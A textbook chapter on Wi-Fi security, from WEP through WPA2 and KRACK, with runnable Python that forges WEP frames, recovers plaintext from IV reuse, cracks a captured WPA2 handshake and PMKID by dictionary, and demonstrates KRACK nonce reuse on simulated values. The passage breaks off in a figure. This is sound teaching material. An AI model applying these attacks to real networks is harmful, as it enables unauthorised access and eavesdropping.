# 9. Wi-Fi security

*A wired network has a cable you can guard. A wireless one sends every frame
into the air, through walls and across the street, to anyone with a receiver.
Wi-Fi security has had to protect that first hop since 1997, and its history is
the most complete catalogue of protocol mistakes in this book: a cipher used
the wrong way, a checksum used as a MAC, a handshake that reinstalled its own
key, a password exchange that leaked through its timing. This chapter takes
them in order. You will forge a WEP frame without the key, check a real WPA2
handshake recorded from hostapd and crack its passphrase offline, see why a
replayed handshake message breaks encryption, run WPA3's SAE exchange on P-256,
and then use its timing to cut a dictionary down to a single word, before
matching the standard's own SAE and hash-to-element test vectors. Then the
enterprise side, open networks, attacks on how frames are queued and named,
and what to configure today.*

!!! abstract "In this chapter"
    **You will learn:**

    - why WEP failed, by attacking it, and what WPA and TKIP patched;
    - WPA2's key hierarchy (PMK, PTK, GTK) and its 4-way handshake, by
      computing a real one;
    - why a WPA2-Personal handshake, or even one message, lets anyone test
      passwords offline;
    - KRACK: how a replayed handshake message forces nonce reuse, told
      message by message;
    - WPA3-Personal's SAE (Dragonfly), by hand in a group of 11 elements and
      in code on P-256, and the Dragonblood side channels;
    - hash-to-element, coded and checked against IEEE 802.11's Annex J;
    - WPA2- and WPA3-Enterprise with 802.1X and EAP, and their weak points;
    - open networks with OWE, coded; protected management frames; and newer
      attacks on frame handling, power-save queues, network names and group
      keys.

    **You need:** [Chapter 1](01-What-a-Protocol-Must-Do.md) (password
    protocols, offline guessing) and [Chapter 2](02-Certificates-and-PKI.md) for
    Enterprise; RC4 from [Chapter 5 of book 1](../../book/05-Stream-Ciphers.md),
    PBKDF2 from [Chapter 11](../../book/11-Passwords-and-Key-Derivation.md) and
    elliptic curves from [Chapter 15](../../book/15-Elliptic-Curves.md).

    **Levels:** §9.1 to §9.4 are for beginners, §9.5 to §9.14 are
    intermediate, §9.15 is expert.

## 9.1 The problem

*Level: beginner.*

The IEEE 802.11 standard of 1997 defined wireless local networks and, with
them, **Wired Equivalent Privacy** (WEP). The name stated the goal: make the
radio link as private as a cable. Nobody expected it to defend against a
determined attacker; it was meant to keep the neighbors out. It did not manage
even that.

Wireless networking has two problems a wired one lacks. **Anyone can listen**,
so every frame must be encrypted. And **anyone can transmit**, so the network
must know that a frame came from a member, and members must know that the
"access point" they are talking to is the real one. On top of that, the
protocol has to run in cheap chips with little memory, on battery-powered
devices, for users who will type a password once and never think about it
again.

The timeline is short and dense. WEP was broken in 2001. The Wi-Fi Alliance, the
industry group that certifies devices, published **WPA** in 2003 as a stopgap
that could run on WEP hardware after a firmware update. The IEEE finished
**802.11i** in 2004, certified as **WPA2**, with AES and a new key handshake;
it lasted fourteen years as the only serious option. **WPA3** arrived in 2018,
replacing the password handling of WPA2-Personal with a password-authenticated
key exchange. Each generation was driven by a public attack on the one before.

<figure class="mars-fig">
<svg viewBox="0 0 640 400" width="640" role="img" aria-label="Timeline of Wi-Fi security from WEP in 1997 to WPA3 updates in 2024" fill="currentColor" font-size="13.5">
<line x1="92" y1="8" x2="92" y2="392" stroke="currentColor" stroke-width="1.6"/>
<text x="78" y="27" text-anchor="end" font-weight="bold">1997</text>
<circle cx="92" cy="22" r="3.5"/>
<text x="108" y="27">802.11 with WEP: RC4 and CRC-32</text>
<text x="78" y="57" text-anchor="end" font-weight="bold" class="acc-fill">2001</text>
<circle cx="92" cy="52" r="4.5" class="acc-fill"/>
<text x="108" y="57" class="acc-fill">WEP broken: forgery, IV reuse, FMS key recovery</text>
<text x="78" y="87" text-anchor="end" font-weight="bold">2003</text>
<circle cx="92" cy="82" r="3.5"/>
<text x="108" y="87">WPA with TKIP, a firmware-level patch</text>
<text x="78" y="117" text-anchor="end" font-weight="bold">2004</text>
<circle cx="92" cy="112" r="3.5"/>
<text x="108" y="117">802.11i, certified as WPA2: AES-CCMP, 4-way handshake</text>
<text x="78" y="147" text-anchor="end" font-weight="bold" class="acc-fill">2007</text>
<circle cx="92" cy="142" r="4.5" class="acc-fill"/>
<text x="108" y="147" class="acc-fill">PTW cracks WEP in a minute; TJX breach via WEP</text>
<text x="78" y="177" text-anchor="end" font-weight="bold">2009</text>
<circle cx="92" cy="172" r="3.5"/>
<text x="108" y="177">802.11w: protected management frames</text>
<text x="78" y="207" text-anchor="end" font-weight="bold" class="acc-fill">2012</text>
<circle cx="92" cy="202" r="4.5" class="acc-fill"/>
<text x="108" y="207" class="acc-fill">MS-CHAPv2 reduced to one DES key</text>
<text x="78" y="237" text-anchor="end" font-weight="bold" class="acc-fill">2017</text>
<circle cx="92" cy="232" r="4.5" class="acc-fill"/>
<text x="108" y="237" class="acc-fill">KRACK: key reinstallation in the 4-way handshake</text>
<text x="78" y="267" text-anchor="end" font-weight="bold">2018</text>
<circle cx="92" cy="262" r="3.5"/>
<text x="108" y="267">WPA3 with SAE; PMKID attack on WPA2; Enhanced Open</text>
<text x="78" y="297" text-anchor="end" font-weight="bold" class="acc-fill">2019</text>
<circle cx="92" cy="292" r="4.5" class="acc-fill"/>
<text x="108" y="297" class="acc-fill">Dragonblood: side channels and downgrade in WPA3</text>
<text x="78" y="327" text-anchor="end" font-weight="bold">2020</text>
<circle cx="92" cy="322" r="3.5"/>
<text x="108" y="327">802.11-2020 adds hash-to-element; WPA3 3.0: SAE-PK</text>
<text x="78" y="357" text-anchor="end" font-weight="bold" class="acc-fill">2021</text>
<circle cx="92" cy="352" r="4.5" class="acc-fill"/>
<text x="108" y="357" class="acc-fill">FragAttacks: frame aggregation and fragmentation</text>
<text x="78" y="387" text-anchor="end" font-weight="bold">2024</text>
<circle cx="92" cy="382" r="3.5"/>
<text x="108" y="387">802.11-2024; Wi-Fi 7 requires WPA3 and GCMP-256</text>
</svg>
<figcaption>Figure 9.1. Wi-Fi security, attack by attack. Accent marks the breaks that forced each new generation.</figcaption>
</figure>

## 9.2 WEP, and how not to use a stream cipher

*Level: beginner.*

WEP encrypted each frame with RC4. The RC4 key was a 24-bit **initialization
vector** (IV), sent in the clear with the frame, followed by the network's
shared key of 40 bits (later 104). Integrity came from an **ICV**: a CRC-32
checksum of the plaintext, encrypted along with it. Every device on the network
used the same key, typed in by hand and rarely changed.

Nikita Borisov, Ian Goldberg and David Wagner showed in early 2001 that nearly
every part of this was wrong. Two of their observations need nothing but the
definitions:

- **CRC-32 is linear.** Changing bits of a message changes its CRC in a way
  that depends only on which bits changed, not on the message. RC4 encryption is
  XOR with a keystream, so flipping a ciphertext bit flips the same plaintext
  bit. Together: an attacker can change any bits of an encrypted frame and fix
  the encrypted checksum to match, without knowing the key or the plaintext.
- **IVs repeat.** With only $2^{24}$ IVs, and many cards choosing them at
  random or starting from zero at every reset, the same IV, and therefore the
  same keystream, comes back after a few thousand frames (the birthday bound,
  $\sqrt{2^{24}} = 4{,}096$). Two frames under the same keystream XOR to the
  XOR of their plaintexts, and one known plaintext reveals the other.

### Break it: WEP without the key

```python
# WEP (1999): RC4 keyed with a 24-bit IV and the shared key, CRC-32 as the
# "integrity check". Two of its failures, without ever learning the key.
import random, struct, zlib

def rc4(key, n):
    S, j = list(range(256)), 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256; S[i], S[j] = S[j], S[i]
    out, i, j = bytearray(), 0, 0
    for _ in range(n):
        i = (i + 1) % 256; j = (j + S[i]) % 256; S[i], S[j] = S[j], S[i]
        out.append(S[(S[i] + S[j]) % 256])
    return bytes(out)
def xor(a, b): return bytes(x ^ y for x, y in zip(a, b))
def crc(b): return struct.pack("<I", zlib.crc32(b))
KEY = bytes.fromhex("a1b2c3d4e5")                  # 40-bit WEP key, never used by the attacker

def wep_send(iv, plain):
    body = plain + crc(plain)                      # ICV = CRC-32 of the plaintext
    return iv + xor(body, rc4(iv + KEY, len(body)))
def wep_receive(frame):
    iv, ct = frame[:3], frame[3:]
    body = xor(ct, rc4(iv + KEY, len(ct)))
    plain, icv = body[:-4], body[-4:]
    return plain if crc(plain) == icv else None

# 1. Bit flipping: CRC-32 is linear, so the attacker can change the plaintext
# and fix the ICV, knowing only where the field is.
packet = b"TO 10.0.0.7  PAY 0010 credits to rover-3"
frame = wep_send(b"\x01\x02\x03", packet)
delta = xor(b"TO 10.0.0.7  PAY 0010", b"TO 10.0.0.7  PAY 9990").ljust(len(packet), b"\0")
icv_delta = xor(crc(delta), crc(bytes(len(packet))))
forged = frame[:3] + xor(frame[3:], delta + icv_delta)
print("receiver accepts the forged frame:", wep_receive(forged))

# 2. IV reuse: with 2^24 IVs chosen at random, a repeat comes quickly (birthday).
rng, seen = random.Random(2001), {}
for count in range(1, 100000):
    iv = rng.getrandbits(24)
    if iv in seen:
        print("first repeated IV after", count, "frames")
        break
    seen[iv] = count
c1 = wep_send(b"\x0a\x0b\x0c", b"GET /index.html HTTP/1.0")
c2 = wep_send(b"\x0a\x0b\x0c", b"PASSWORD=olympus-mons-26")
known = b"GET /index.html HTTP/1.0"                 # guessable first packet
print("second plaintext recovered:", xor(xor(c1[3:], c2[3:]), known))
```

```text
receiver accepts the forged frame: b'TO 10.0.0.7  PAY 9990 credits to rover-3'
first repeated IV after 6778 frames
second plaintext recovered: b'PASSWORD=olympus-mons-26'
```

Worse came that summer. Scott Fluhrer, Itsik Mantin and Adi Shamir showed that
for certain "weak" IVs, the first byte of RC4's output leaks information about
the key bytes that follow the IV, and because WEP put the IV *in front of* the
key, an eavesdropper could recover the whole key from a few million frames.
Adam Stubblefield, John Ioannidis and Aviel Rubin implemented the attack within
weeks; free tools followed. Better statistical attacks cut the number of
frames, and in 2007 Erik Tews, Ralf-Philipp Weinmann and Andrei Pyshkin
recovered 104-bit keys from about 40,000 frames, which an attacker could
provoke in a minute by replaying captured requests.

WEP stayed in service long after. The theft of at least 45 million payment card
numbers from the retailer TJX, disclosed in 2007, began with attackers who
cracked the WEP network of a store and worked inward from there.

!!! note "Life story: WEP"
    **Born:** 1997, IEEE 802.11 · **Purpose:** make wireless "as private as a
    wire" · **Helped:** almost no one; it taught a generation of engineers
    that a stream cipher needs unique nonces, a checksum is not a MAC, and an
    IV must not be glued to a long-term key · **Retired:** deprecated by the
    IEEE in 2004 · **Replaced by:** WPA's TKIP, then WPA2's CCMP

**WPA and TKIP** (2003) had to fix WEP on hardware that could only do RC4. The
**Temporal Key Integrity Protocol** mixed a per-packet key from a temporal key,
the sender's address and a 48-bit sequence counter, so no two frames used
related RC4 keys, and added a real, if weak, MAC called **Michael**, chosen
because it was cheap enough for old chips. Michael was so weak that TKIP had to
shut the network down for a minute when it detected two forgeries in a minute.
Martin Beck and Erik Tews (2008) showed how to decrypt and inject short frames
anyway. TKIP was a bridge, crossed and then abandoned; it is no longer allowed
in new certified devices.

## 9.3 WPA2: the key hierarchy

*Level: beginner.*

WPA2 (802.11i, 2004) replaced RC4 with AES in **CCM** mode (counter mode with
CBC-MAC), called **CCMP**: a 48-bit packet number in every frame forms part of
the nonce, and an 8-byte MIC authenticates it. More important than the cipher
was a key hierarchy, so that the long-term secret is never used directly on
traffic.

- The **pairwise master key** (PMK) is the long-term secret between one
  device and the network. In **WPA2-Personal** it is derived from the
  passphrase alone:

  $$
  \mathrm{PMK} = \mathrm{PBKDF2}(\mathrm{HMAC\text{-}SHA1}, \text{passphrase},
  \text{SSID}, 4096, 256\text{ bits}).
  $$

  Every device with the passphrase has
  the same PMK. In **WPA2-Enterprise** it comes from an EAP login to a server
  (§9.10) and is different for each user and session.
- The **pairwise transient key** (PTK) is derived fresh at every connection
  from the PMK, both MAC addresses and two random nonces. It splits into the
  **KCK** (to authenticate handshake messages), the **KEK** (to encrypt keys
  sent in the handshake) and the **TK** (the traffic key for CCMP).
- The **group temporal key** (GTK) encrypts broadcast and multicast frames.
  The access point chooses it and sends it to each device under its KEK. Every
  device on the network has the same GTK.
- The **integrity group temporal key** (IGTK) authenticates broadcast
  management frames when protected management frames are on (§9.11).

<figure class="mars-fig">
<svg viewBox="0 0 640 330" width="640" role="img" aria-label="Wi-Fi key hierarchy: the PMK from a passphrase, SAE or EAP; the PTK from the PMK, addresses and nonces, split into KCK, KEK and TK; the GTK and IGTK sent by the access point under the KEK" fill="currentColor" font-size="13.5">
<rect x="20" y="20" width="180" height="44" rx="6" class="soft" stroke="currentColor"/>
<text x="110" y="47" text-anchor="middle">WPA2 passphrase</text>
<rect x="230" y="20" width="180" height="44" rx="6" class="soft" stroke="currentColor"/>
<text x="320" y="47" text-anchor="middle">WPA3 SAE exchange</text>
<rect x="440" y="20" width="180" height="44" rx="6" class="soft" stroke="currentColor"/>
<text x="530" y="47" text-anchor="middle">Enterprise: EAP</text>
<text x="110" y="82" text-anchor="middle" font-size="12">PBKDF2, 4,096 rounds</text>
<line x1="110" y1="88" x2="290" y2="112" stroke="currentColor"/>
<line x1="320" y1="64" x2="320" y2="112" stroke="currentColor"/>
<line x1="530" y1="64" x2="350" y2="112" stroke="currentColor"/>
<rect x="220" y="112" width="200" height="44" rx="6" class="soft-acc" stroke="currentColor"/>
<text x="320" y="139" text-anchor="middle" font-weight="bold">PMK</text>
<line x1="320" y1="156" x2="320" y2="192" stroke="currentColor"/>
<text x="330" y="180" font-size="12">+ both MAC addresses, ANonce, SNonce</text>
<rect x="220" y="192" width="200" height="44" rx="6" class="soft-acc" stroke="currentColor"/>
<text x="320" y="219" text-anchor="middle" font-weight="bold">PTK (per connection)</text>
<line x1="260" y1="236" x2="110" y2="270" stroke="currentColor"/>
<line x1="320" y1="236" x2="320" y2="270" stroke="currentColor"/>
<line x1="380" y1="236" x2="530" y2="270" stroke="currentColor"/>
<rect x="40" y="270" width="140" height="44" rx="6" class="soft" stroke="currentColor"/>
<text x="110" y="290" text-anchor="middle">KCK</text><text x="110" y="306" text-anchor="middle" font-size="12">handshake MICs</text>
<rect x="250" y="270" width="140" height="44" rx="6" class="soft" stroke="currentColor"/>
<text x="320" y="290" text-anchor="middle">KEK</text><text x="320" y="306" text-anchor="middle" font-size="12">wraps GTK, IGTK</text>
<rect x="460" y="270" width="140" height="44" rx="6" class="soft" stroke="currentColor"/>
<text x="530" y="290" text-anchor="middle">TK</text><text x="530" y="306" text-anchor="middle" font-size="12">CCMP traffic key</text>
</svg>
<figcaption>Figure 9.2. Three ways to a PMK, one way from it. Only the PTK touches traffic, and it is new at every connection.</figcaption>
</figure>

## 9.4 The 4-way handshake, by hand

*Level: beginner.*

After a device (the **supplicant**) associates with an access point (the
**authenticator**), and once both hold the PMK, they run the 4-way handshake in
EAPOL-Key frames.

<div class="mars-steps" markdown>

1. **Message 1 (AP to device):** the AP's random **ANonce**.
2. **The device** picks its own **SNonce** and computes

   $$
   \mathrm{PTK} = \mathrm{PRF}\bigl(\mathrm{PMK},\ \texttt{"Pairwise key expansion"},\
   \min(AA, SPA) \,\|\, \max(AA, SPA) \,\|\, \min(N_A, N_S) \,\|\, \max(N_A, N_S)\bigr),
   $$

   where $AA$ and $SPA$ are the two MAC addresses. Sorting makes both sides
   compute the same string.
3. **Message 2 (device to AP):** the SNonce and the device's security
   capabilities (its RSN element), with a **MIC** under the KCK. The AP now
   computes the same PTK and checks the MIC, which proves the device has the PMK.
4. **Message 3 (AP to device):** the AP's capabilities as announced in its
   beacon (so a forged beacon offering weaker options is caught), the GTK
   encrypted under the KEK, and a MIC. The device checks it, which proves the
   AP has the PMK too, and **installs the keys**.
5. **Message 4 (device to AP):** an acknowledgement with a MIC. The AP installs
   the keys. Encrypted traffic begins.

</div>

<figure class="mars-fig">
<svg viewBox="0 0 640 330" width="640" role="img" aria-label="The 4-way handshake: message 1 with ANonce, message 2 with SNonce and MIC, message 3 with the encrypted GTK and MIC, message 4 acknowledgement; keys are installed after message 3 on the device and after message 4 on the AP" fill="currentColor" font-size="13.5">
<text x="110" y="22" text-anchor="middle" font-weight="bold">device</text>
<text x="530" y="22" text-anchor="middle" font-weight="bold">access point</text>
<line x1="110" y1="32" x2="110" y2="320" stroke="currentColor"/>
<line x1="530" y1="32" x2="530" y2="320" stroke="currentColor"/>
<text x="110" y="50" text-anchor="middle" font-size="12.5">has PMK</text>
<text x="530" y="50" text-anchor="middle" font-size="12.5">has PMK</text>
<line x1="530" y1="80" x2="114" y2="80" stroke="currentColor" stroke-width="1.5"/>
<polygon points="110,80 122,75 122,85"/>
<text x="320" y="72" text-anchor="middle">1: ANonce</text>
<rect x="20" y="92" width="180" height="24" rx="4" class="soft"/>
<text x="110" y="109" text-anchor="middle" font-size="12.5">pick SNonce, derive PTK</text>
<line x1="110" y1="140" x2="526" y2="140" stroke="currentColor" stroke-width="1.5"/>
<polygon points="530,140 518,135 518,145"/>
<text x="320" y="132" text-anchor="middle">2: SNonce, RSN element, MIC</text>
<rect x="440" y="152" width="180" height="24" rx="4" class="soft"/>
<text x="530" y="169" text-anchor="middle" font-size="12.5">derive PTK, check MIC</text>
<line x1="530" y1="200" x2="114" y2="200" stroke="currentColor" stroke-width="1.5"/>
<polygon points="110,200 122,195 122,205"/>
<text x="320" y="192" text-anchor="middle">3: ANonce, RSN element, {GTK}, MIC</text>
<rect x="20" y="212" width="180" height="24" rx="4" class="soft-acc"/>
<text x="110" y="229" text-anchor="middle" font-size="12.5" class="acc-fill">install PTK and GTK</text>
<line x1="110" y1="262" x2="526" y2="262" stroke="currentColor" stroke-width="1.5"/>
<polygon points="530,262 518,257 518,267"/>
<text x="320" y="254" text-anchor="middle">4: MIC</text>
<rect x="440" y="274" width="180" height="24" rx="4" class="soft-acc"/>
<text x="530" y="291" text-anchor="middle" font-size="12.5" class="acc-fill">install PTK</text>
</svg>
<figcaption>Figure 9.3. The 4-way handshake. The accented steps are where keys are installed; KRACK (§9.6) attacks the first one.</figcaption>
</figure>

The handshake gives mutual proof of the PMK and fresh session keys. What it
does *not* give, in WPA2-Personal, is forward secrecy: the PTK is computed
from the PMK and values sent in the clear, so anyone who records a handshake
and later learns the passphrase can decrypt the whole session. Every device on
a WPA2-Personal network can therefore decrypt every other device's traffic, if
it saw the other device's handshake.

### What is inside an EAPOL-Key frame

All four messages share one frame layout. Flags in a **key information** field
say which message this is; an eight-byte **key replay counter** follows, which
the AP increases with every message it sends and the device echoes, accepting
only values higher than any it has seen; then the 32-byte **nonce**, the
group key's starting packet number, the 16-byte **MIC** (computed with the
field zeroed) and a **key data** field with the RSN element and, in message
3, the wrapped GTK.

Two things follow. A retransmitted message 3 carries a *new*, higher replay
counter, so a device that checks counters correctly still accepts it, and has
to; this is the door KRACK walks through (§9.6). And nothing in message 1 is
authenticated, since the PTK does not yet exist: an attacker can send a forged
message 1 with any ANonce, and a device will answer with a valid message 2.
We will use that in §9.8.

### The PTK by hand

The PRF that turns the PMK into a PTK is HMAC-SHA-1 in a counter loop. For the
run in §9.5, the authenticator's address `02:00:00:00:00:00` is smaller than
the device's `02:00:00:00:02:00`, and the ANonce (starting `47 74`) is smaller
than the SNonce (starting `d3 4e`), so the data string is simply
$AA \,\|\, SPA \,\|\, N_A \,\|\, N_S$: $6 + 6 + 32 + 32 = 76$ bytes. Each HMAC
input is the 22-byte label "Pairwise key expansion", one zero byte, the 76
data bytes and a one-byte counter, 100 bytes in all. Each HMAC-SHA-1 output is
20 bytes and the CCMP PTK needs $16 + 16 + 16 = 48$ (KCK, KEK, TK), so the
counter runs 0, 1, 2 and the last 12 of the 60 bytes are dropped. Sorting by
value, not by role, lets both sides build the same string.

The standard prints test vectors for this PRF and the passphrase mapping,
first in 802.11i's Annex H, today in 802.11's Annex J:

```python
# The 802.11 PRF and the passphrase-to-PSK mapping, checked against the
# test vectors printed in the standard (802.11i Annex H, now 802.11 Annex J).
import hashlib, hmac
def prf(key, label, data, bits):
    out = b""
    for i in range((bits + 159) // 160):            # one HMAC-SHA-1 block = 160 bits
        out += hmac.new(key, label + b"\0" + data + bytes([i]), hashlib.sha1).digest()
    return out[:bits // 8]

print(prf(bytes([0x0b] * 20), b"prefix", b"Hi There", 192).hex())
print(prf(b"Jefe", b"prefix", b"what do ya want for nothing?", 192).hex())
for phrase, ssid in (("password", "IEEE"), ("ThisIsAPassword", "ThisIsASSID")):
    psk = hashlib.pbkdf2_hmac("sha1", phrase.encode(), ssid.encode(), 4096, 32)
    print(f"{phrase:16} {ssid:12} {psk.hex()[:32]}...")
```

It prints:

```text
bcd4c650b30b9684951829e0d75f9d54b862175ed9f00606
51f4de5b33f249adf81aeb713a3c20f4fe631446fabdfa58
password         IEEE         f42c6fc52df0ebef9ebb4b90b38a5f90...
ThisIsAPassword  ThisIsASSID  0dc0d6eb90555ed6419756b9a15ec3e3...
```

The first two lines match the start of the standard's first two PRF test
cases, whose keys and messages are borrowed from RFC 2202's HMAC tests; the
last two are its passphrase vectors. hostapd runs the same checks in its
module tests.

## 9.5 Code it: a real WPA2 handshake, and cracking it

*Level: intermediate.*

The previous version of this page on the site set up hostapd and
wpa_supplicant 2.10 on Linux with simulated radios (`mac80211_hwsim`): one
access point with SSID `IEEE` and passphrase `password`, and a client joining
with WPA2-PSK. The program below takes the values a passive listener would
capture (both MAC addresses, the ANonce from message 1, the SNonce and the MIC
from message 2) and recomputes the keys. The passphrase and SSID were chosen to
match the first test vector of IEEE 802.11's Annex J, whose PMK the program
reproduces.

```python
# WPA2-Personal on a real run (hostapd and wpa_supplicant 2.10, simulated radios,
# Oct 2026): PMK from the passphrase, PTK from the nonces, and the MIC of message 2.
import hashlib, hmac

passphrase, ssid = "password", "IEEE"
pmk = hashlib.pbkdf2_hmac("sha1", passphrase.encode(), ssid.encode(), 4096, 32)
print("PMK", pmk.hex())

# Captured from the air: both MAC addresses, ANonce (message 1), SNonce and MIC (message 2)
aa, spa = bytes.fromhex("020000000000"), bytes.fromhex("020000000200")
anonce = bytes.fromhex("477400533b80b46a2a03c637fae04598fdf03c06b56e01551699960f33aa55b6")
snonce = bytes.fromhex("d34e0d83d9e5997fccd94974c97b5456976b666f6cebf891e20bc00a4460ab2b")
mic = bytes.fromhex("4470e6b894b7255f204ec8a4aeea0a66")
rsne = bytes.fromhex("30140100000fac040100000fac040100000fac020000")

def ptk_from(pmk):                                  # the 802.11 PRF, HMAC-SHA-1, 48 bytes
    data = min(aa, spa) + max(aa, spa) + min(anonce, snonce) + max(anonce, snonce)
    return b"".join(hmac.new(pmk, b"Pairwise key expansion\0" + data + bytes([i]),
                             hashlib.sha1).digest() for i in range(3))[:48]
# Message 2 as sent, with its MIC field zeroed: header, key info, counter,
# SNonce, empty IV/RSC/ID/MIC fields, then the station's RSN element.
msg2 = (bytes.fromhex("0103007502010a0000") + (1).to_bytes(8, "big") + snonce
        + bytes(48) + len(rsne).to_bytes(2, "big") + rsne)
def mic_ok(pmk):
    return hmac.new(ptk_from(pmk)[:16], msg2, hashlib.sha1).digest()[:16] == mic

ptk = ptk_from(pmk)
for name, key in (("KCK", ptk[:16]), ("KEK", ptk[16:32]), ("TK ", ptk[32:])):
    print(name, key.hex())
print("MIC matches:", mic_ok(pmk))
```

```text
PMK f42c6fc52df0ebef9ebb4b90b38a5f902e83fe1b135a70e23aed762e9710a12e
KCK 8202928cfc832489a01fdcd187cb905b
KEK 4700ff26dddb728587a906b1c4708fa0
TK  797bf41d264da28238525af437b6c353
MIC matches: True
```

The PMK matches the standard's test vector, and the KCK, KEK, TK and MIC match
wpa_supplicant's debug log of the run. Now the attack. Everything the program
used except the passphrase was captured from the air, and the MIC is a check
value: a guess is right exactly when it reproduces the MIC.

### Break it: offline guessing, and the PMKID

```python
# Break it: an offline dictionary attack on the captured handshake, and the
# 2018 PMKID shortcut that needs no client at all. Continue from above.
words = ["123456", "qwerty", "arcadia", "letmein", "iloveyou", "sunshine",
         "dragon", "monkey", "football", "password", "trustno1"]
for tries, w in enumerate(words, 1):
    if mic_ok(hashlib.pbkdf2_hmac("sha1", w.encode(), ssid.encode(), 4096, 32)):
        print("passphrase found after", tries, "guesses:", w)
        break
print("cost per guess: 4,096 x 2 HMAC-SHA-1 for the PMK, then 4 more for PTK and MIC")

# PMKID: many access points put this in message 1, to anyone who starts to associate.
pmkid = hmac.new(pmk, b"PMK Name" + aa + spa, hashlib.sha1).digest()[:16]
print("PMKID sent by the AP:", pmkid.hex())
for w in words:
    guess = hashlib.pbkdf2_hmac("sha1", w.encode(), ssid.encode(), 4096, 32)
    if hmac.new(guess, b"PMK Name" + aa + spa, hashlib.sha1).digest()[:16] == pmkid:
        print("same result from the PMKID alone:", w)
        break
```

```text
passphrase found after 10 guesses: password
cost per guess: 4,096 x 2 HMAC-SHA-1 for the PMK, then 4 more for PTK and MIC
PMKID sent by the AP: 93f7a76e2c97eb7399d2843fee9ae48b
same result from the PMKID alone: password
```

No further contact with the network is needed, so the only limit is
computing power. PBKDF2's 4,096 rounds slow each guess, but graphics cards
test hundreds of thousands to millions of WPA2 passphrases per second with
hashcat, and the SSID as salt only stops precomputation for SSIDs that are not
common. A WPA2-Personal passphrase must be long and random to survive; "a
sentence nobody would guess" usually is guessed.

In 2018 Jens Steube, the author of hashcat, found that many access points
include a **PMKID** in message 1, for a roaming feature:

$$\mathrm{PMKID} = \mathrm{HMAC\text{-}SHA1\text{-}128}(\mathrm{PMK},\
\texttt{"PMK Name"} \,\|\, AA \,\|\, SPA).$$

It depends only on the PMK and the
two addresses, so an attacker can ask the access point for one by starting to
associate, with no client device present, and crack it offline like the MIC.

## 9.6 KRACK: reinstalling a key

*Level: intermediate.*

In October 2017 Mathy Vanhoef and Frank Piessens published **KRACK**, key
reinstallation attacks, against the 4-way handshake itself, in every
implementation that followed the standard. The handshake had been proven secure
in 2005; the proof was right, and the attack worked anyway, because the proof
said nothing about *when* keys are installed.

The device installs the PTK when it receives message 3 and sends message 4. If
message 4 is lost, the AP resends message 3, and the standard said the device
must accept it and answer again, which it does by installing the same key
again. Installing a key resets its **packet number** to zero. CCMP builds its
nonce from the packet number, so after the reinstallation the device encrypts
new frames with nonces it has already used under the same key. An attacker in
the middle (on a different channel, posing as the AP) only has to hold back
message 4 and replay message 3 whenever it likes.

### Break it: nonce reuse after a replayed message 3

CCMP is AES in counter mode with a MAC. The program uses a SHA-256 keystream as
a stand-in for AES so that it runs with the standard library; the effect of
reusing a counter-mode nonce does not depend on the block cipher.

```python
# KRACK (2017), the core of it: a replayed message 3 makes the client install
# the same key again and reset its packet number, so the nonce repeats.
# CCMP is AES in counter mode plus a MIC; a SHA-256 keystream stands in for AES here.
import hashlib
def keystream(tk, pn, n):                  # stand-in for AES-CTR under the TK, nonce from PN
    out = b""
    for block in range((n + 31) // 32):
        out += hashlib.sha256(tk + pn.to_bytes(6, "big") + bytes([block])).digest()
    return out[:n]
def xor(a, b): return bytes(x ^ y for x, y in zip(a, b))

class Client:
    def install_key(self, tk):             # the bug: also resets the packet number
        self.tk, self.pn = tk, 1
    def send(self, plain):
        frame = (self.pn, xor(plain, keystream(self.tk, self.pn, len(plain))))
        self.pn += 1
        return frame

tk = bytes(16)
c = Client()
c.install_key(tk)                          # message 3 arrives: install the TK
f1 = c.send(b"GET /habitat/login HTTP/1.1  Host: hab")   # predictable request
c.install_key(tk)                          # attacker replays message 3: same TK, PN back to 1
f2 = c.send(b"user=jim&pass=red-dust-2026&action=login")
print("packet numbers:", f1[0], "then again", f2[0])
known = b"GET /habitat/login HTTP/1.1  Host: hab"
print("attacker computes f1 XOR f2 XOR known request:")
print("  ", xor(xor(f1[1], f2[1]), known))
```

```text
packet numbers: 1 then again 1
attacker computes f1 XOR f2 XOR known request:
   b'user=jim&pass=red-dust-2026&action=log'
```

The attacker never learns the key, but two frames encrypted with the same
keystream give away the XOR of their plaintexts, and a predictable request
reveals the other frame. Against CCMP, nonce reuse also lets replayed frames be
accepted; against GCMP and TKIP it was worse, allowing forgery. In Linux's
wpa_supplicant versions 2.4 and 2.5, also used by Android 6.0, the bug was
much worse: the second installation installed an **all-zero key**, because the
key had been wiped from memory after the first installation, so the attacker
could decrypt everything.

### The attack, message by message

The attacker must sit between the two parties without breaking any MIC.
Vanhoef and Piessens used a **channel-based man in the middle**, which they
had published in 2014: clone the real AP, MAC address and all, on another
channel, and lure the device there with forged channel switch announcements.
The attacker then relays every frame unchanged; it cannot read or forge
anything, but it decides what is delivered and when.

<div class="mars-steps" markdown>

1. Messages 1, 2 and 3 are forwarded as normal. The device installs the PTK and
   sends message 4.
2. The attacker **drops message 4**. The AP, still waiting, will time out.
3. The device sends data under packet numbers 1, 2, 3, ...; the attacker
   records them.
4. The AP **retransmits message 3** with a fresh replay counter. The device
   accepts it, as the standard requires, and **reinstalls the same PTK**,
   resetting its packet number to 1 (and its receive replay window).
5. Its next frames reuse packet numbers 1, 2, 3, ... under the same TK, so
   each pair with the same number shares a keystream.
6. The attacker forwards the second message 4, the AP completes the
   handshake, and nothing looks wrong.

</div>

<figure class="mars-fig">
<svg viewBox="0 0 640 400" width="640" role="img" aria-label="KRACK message flow. The attacker sits between the device and the access point on a cloned channel. Messages 1 to 3 pass. The device installs the key and sends message 4, which the attacker drops. The device sends data with packet numbers 1 and 2. The access point retransmits message 3, the attacker forwards it, the device reinstalls the key and resets the packet number, and the next data frame again uses packet number 1." fill="currentColor" font-size="13">
<text x="80" y="20" text-anchor="middle" font-weight="bold">device</text>
<text x="320" y="20" text-anchor="middle" font-weight="bold">attacker (cloned AP)</text>
<text x="560" y="20" text-anchor="middle" font-weight="bold">access point</text>
<line x1="80" y1="30" x2="80" y2="390" stroke="currentColor"/>
<line x1="320" y1="30" x2="320" y2="390" stroke="currentColor" stroke-dasharray="4 3"/>
<line x1="560" y1="30" x2="560" y2="390" stroke="currentColor"/>
<line x1="556" y1="55" x2="84" y2="55" stroke="currentColor"/>
<polygon points="80,55 92,50 92,60"/>
<text x="440" y="49" text-anchor="middle" font-size="12">msg 1, 2, 3 forwarded</text>
<line x1="84" y1="68" x2="556" y2="68" stroke="currentColor" stroke-opacity=".5"/>
